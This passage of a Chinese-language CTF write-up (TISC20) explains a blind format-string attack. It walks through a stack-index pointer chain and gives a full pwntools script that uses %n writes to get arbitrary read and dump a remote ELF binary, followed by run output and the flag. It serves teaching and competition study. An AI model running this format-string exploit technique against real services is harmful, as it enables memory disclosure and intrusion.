当索引`26`的地址进行写操作时，索引`39`的地址被`0xdead`覆盖最后四位。

```
...
17  0x7ffe079258b0
18  0x0
19  0x0
20  0xf5fe6c5e253d7550
21  0xf45110276a537550
22  0x0
23  0x0
24  0x0
25  0x1
26  0x7ffe079258b8
27  0x7ffe079258c8
28  0x7f29b9cee190
29  0x0
30  0x0
31  0x5634bfab41f0
32  0x7ffe079258b0
33  0x0
34  0x0
35  0x5634bfab421e
36  0x7ffe079258a8
37  0x1c
38  0x1
39  0x7ffe0000dead
...
```

此时，我们就获得一个原语。由于索引`39`包含堆栈地址，我们可以对其修改，让其作为跳板将数据写入另一个索引，这样就可以指向堆栈中的任意点，形如`stack ptr 1 -&gt; stack ptr 2 -&gt; somewhere in the stack`。<br>
接下来，需要找寻文件的基址，这里可以使用`.bbs`中的字符串地址和对应的掩码。ELF头是以`ELF`开头，经过一系列尝试，掩码为`0xffffffffffffe000`有很大可能得到正确的地址。完整的脚本如下：

```
#!/usr/bin/python

from pwn import *
import pwnlib

#context.log_level = 'debug'
context.update(arch = 'amd64', os = 'linux')


def run_leak(p, payload):
    prefix = b"XXXX"
    postfix = b'ZZZZ'
    total = prefix + payload + postfix
    p.sendline(total)
    p.recvuntil(prefix)
    data = p.recvuntil(postfix)
    return data[:-4]

def adjust_bouncer(p, base, index, offset=0):
    # Adjust the value of index 39 to point at a particular index.
    address = base + (index * 8) + offset
    lower_address = address &amp; 0xffff
    payload = b'%' + str(lower_address).encode('utf-8') + b'c%26$hn'
    p.sendline(payload)
    p.recv()

def leak_address(p, index):
    payload = ('%' + str(index) + '$p').encode('utf-8')
    r = run_leak(p, payload)
    address = int(r, 16)
    return address

def leak_data(p, index):
    payload = ('%' + str(index) + '$s').encode('utf-8')
    r = run_leak(p, payload)
    return r

def write_single(p, value):
    # Value must be a 2 bytes short
    if value &gt; 0:
        payload = b'%' + str(value).encode('utf-8') + b'c%39$hn'
    else:
        payload = b'%39$hn'
    p.sendline(payload)
    p.recv()

def write_index(p, index_base, index, address, value):
    # Writes an arbitrary value to an index.
    if index == 39:
        # NOT ALLOWEEED
        return

    for i in range(0, 8, 2):
        current_portion = (address &gt;&gt; (i * 8)) &amp; 0xffff
        adjust_bouncer(p, index_base, index, offset=i)
        write_single(p, current_portion)

def arbitrary_read(p, index_base, address):
    write_index(p, index_base, 41, address, 0)
    data = leak_data(p, 41)
    return data

def main():
    p = remote('fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg', 42000)

    # Index 17 points to Index 38
    # Figure out address of Index 38
    index_17_value = leak_address(p, 17)
    index_38_address = index_17_value
    log.info("Got address of index 38: 0x%x" % index_38_address)

    # Figure out index 0
    index_base = index_38_address - (38 * 8)
    log.info("RSP (index 0): 0x%x" % index_base)

    # Figure out the halfed address to index 39
    index_26_value = leak_address(p, 26)
    log.info("Got address of index 26 (index 39): 0x%x" % index_26_value)

    index_39_value = leak_address(p, 39)
    log.info("Got value of index 39: 0x%x" % index_39_value)

    # Leak address of the format string just to verify.
    index_4_value = leak_address(p, 4)
    log.info("Got address of index 4 (format string): 0x%x" % index_4_value)

    # Leak address of possible .text.
    index_7_value = leak_address(p, 7)
    log.info("Got address of index 7 (format string): 0x%x" % index_7_value)
    elf_start = index_7_value &amp; 0xffffffffffffe000
    log.info("ELF Start: 0x%x" % elf_start)

    def leak(address):
        return arbitrary_read(p, index_base, address)

    elf_header = leak(elf_start)
    log.info("ELF Start Bytes: %s" % elf_header)

    if b'\x7fELF\x02\x01\x01' != elf_header:
        log.info('Attempt failed.')
        return

    elf_contents = elf_header + b'\x00'
    offset = len(elf_contents)
    fd = open("stolen_elf", 'wb')
    fd.write(elf_contents)
    running_index = -1
    while True:
        try:
            next_content = leak(elf_start + offset) + b'\x00'
            elf_contents += next_content
            offset += len(next_content)
            #print(offset, next_content)
            fd.write(next_content)
            if b'TISC20' in next_content:
                flag = next_content.decode('utf-8')[:-1]
                log.success('Discovered flag: `{``}`'.format(flag))
            if float(len(elf_contents))/100 &gt; running_index + 1:
                log.info("Got `{``}` bytes of ELF data so far.".format(len(elf_contents)))
                running_index += 1
        except:
            log.info("Got EOF, leaked all we could.")
            break

    log.info("Obtained `{``}` bytes of ELF file.".format(len(elf_contents)))
    log.success("Flag: `{``}`.".format(flag))

if __name__ == '__main__':
    main()
```

当脚本能成功运行时，检测到ELF头文件，转存为ELF二进制文件。经过很长时间的运行，最终得到falg：

```
r10@kali:~/tisc$ python exploit6.py
[+] Opening connection to fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg on port 42000: Done
[*] Got address of index 38: 0x7ffca01db940
[*] RSP (index 0): 0x7ffca01db810
[*] Got address of index 26 (index 39): 0x7ffca01db948
[*] Got value of index 39: 0x7ffca01dcf5c
[*] Got address of index 4 (format string): 0x5557a54680a0
[*] Got address of index 7 (format string): 0x5557a54652e0
[*] ELF Start: 0x5557a5464000
[*] ELF Start Bytes: b'\x7fELF\x02\x01\x01'
[*] Got 9 bytes of ELF data so far.
[*] Got 101 bytes of ELF data so far.
[*] Got 201 bytes of ELF data so far.
[*] Got 301 bytes of ELF data so far.
[*] Got 402 bytes of ELF data so far.
[*] Got 501 bytes of ELF data so far.
[*] Got 602 bytes of ELF data so far.
[*] Got 701 bytes of ELF data so far.
[*] Got 820 bytes of ELF data so far.
[*] Got 902 bytes of ELF data so far.
[*] Got 1001 bytes of ELF data so far.
...
[*] Got 16401 bytes of ELF data so far.
[+] Discovered flag: TISC20`{`Ch3ckp01nt_1_349ufh98hd98iwqfkoieh938`}`
...
```

**Flag:** `TISC20`{`Ch3ckp01nt_1_349ufh98hd98iwqfkoieh938`}``
